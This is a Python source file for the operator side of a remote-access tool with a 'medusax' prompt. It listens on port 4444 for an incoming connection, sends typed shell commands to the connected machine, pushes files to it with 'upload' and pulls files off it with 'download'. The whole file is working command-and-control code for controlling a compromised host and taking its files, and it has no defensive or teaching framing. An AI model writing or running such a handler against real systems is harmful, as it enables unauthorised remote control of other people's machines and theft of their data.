import socket
import json
import os
import base64
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

class TCPHandler:
    def __init__(self, ip, port):
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind((ip, port))
        self.listener.listen(0)
        print(Fore.GREEN + "[+] Waiting for incoming connection...")

        self.conn, self.addr = self.listener.accept()
        print(Fore.CYAN + f"[+] Connection established from {self.addr[0]}:{self.addr[1]}\n")

    def send_json(self, data):
        try:
            json_data = json.dumps(data)
            self.conn.send(json_data.encode())
        except Exception as e:
            print(Fore.RED + f"[!] Error sending data: {e}")

    def receive_json(self):
        json_data = ""
        while True:
            try:
                json_data += self.conn.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def write_file(self, path, content):
        try:
            with open(path, "wb") as file:
                file.write(base64.b64decode(content))
            return Fore.GREEN + "[+] Download successful"
        except Exception as e:
            return Fore.RED + f"[!] Failed to write file: {e}"

    def read_file(self, path):
        try:
            with open(path, "rb") as file:
                return base64.b64encode(file.read()).decode()
        except Exception as e:
            print(Fore.RED + f"[!] Failed to read file: {e}")
            return ""

    def execute_command(self, command):
        self.send_json(command)
        if command[0] == "exit":
            print(Fore.YELLOW + "[*] Closing connection.")
            self.conn.close()
            exit()
        return self.receive_json()

    def run(self):
        try:
            while True:
                command = input(Fore.YELLOW + "admin@medusax~$ ").strip()
                if not command:
                    continue

                command = command.split(" ")

                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    if file_content:
                        command.append(file_content)
                    else:
                        print(Fore.RED + "[!] Upload failed. File not found or empty.")
                        continue

                response = self.execute_command(command)

                if command[0] == "download":
                    print(self.write_file(command[1], response))
                else:
                    print(Fore.WHITE + str(response))

        except KeyboardInterrupt:
            print(Fore.RED + "\n[!] Server shutting down.")
            self.conn.close()
            self.listener.close()

if __name__ == "__main__":
    ip = "127.0.0.1"  # Replace with the actual IP
    port = 4444       # Replace with your desired port
    handler = TCPHandler(ip, port)
    handler.run()
